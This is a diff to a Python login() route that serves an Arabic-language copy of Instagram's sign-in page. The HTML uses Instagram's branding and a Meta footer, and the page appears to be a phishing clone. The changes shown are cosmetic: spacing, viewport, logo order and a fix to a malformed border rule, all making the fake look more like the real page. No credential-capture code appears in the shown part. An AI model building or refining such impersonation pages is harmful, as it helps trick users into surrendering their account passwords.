@@ -48,7 +48,7 @@ def login():
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>تسجيل الدخول • Instagram</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
@@ -60,8 +60,8 @@ def login():
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            padding: 20px;
+            justify-content: space-between;
+            padding: 20px 20px 15px 20px;
         }
 
         .container {
@@ -70,12 +70,13 @@ def login():
             display: flex;
             flex-direction: column;
             align-items: center;
+            margin: auto;
         }
 
         .lang-text {
             color: #a8a8a8;
             font-size: 12px;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             text-align: center;
         }
 
@@ -87,7 +88,7 @@ def login():
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
         }
         
         .insta-icon svg {
@@ -121,7 +122,6 @@ def login():
         .input-group input { 
             width: 100%; 
             background: #121212; 
-            border: 1px symbol solid #363636;
             border: 1px solid #363636; 
             border-radius: 8px; 
             padding: 12px; 
@@ -154,7 +154,7 @@ def login():
             text-decoration: none; 
             display: block; 
             text-align: center; 
-            margin-bottom: 25px; 
+            margin-bottom: 35px; 
         }
 
         .signup-card { 
@@ -167,7 +167,6 @@ def login():
             color: #0095f6; 
             font-weight: 600; 
             background: #121212;
-            margin-bottom: 30px;
         }
 
         .meta-footer {
@@ -175,7 +174,7 @@ def login():
             align-items: center;
             justify-content: center;
             gap: 5px;
-            margin-top: 10px;
+            margin-top: 35px;
         }
         
         .meta-brand {
@@ -223,8 +222,8 @@ def login():
         </div>
 
         <div class="meta-footer">
-            <div class="meta-brand">Meta</div>
             <span class="meta-symbol">∞</span>
+            <div class="meta-brand">Meta</div>
         </div>
     </div>
 </body>
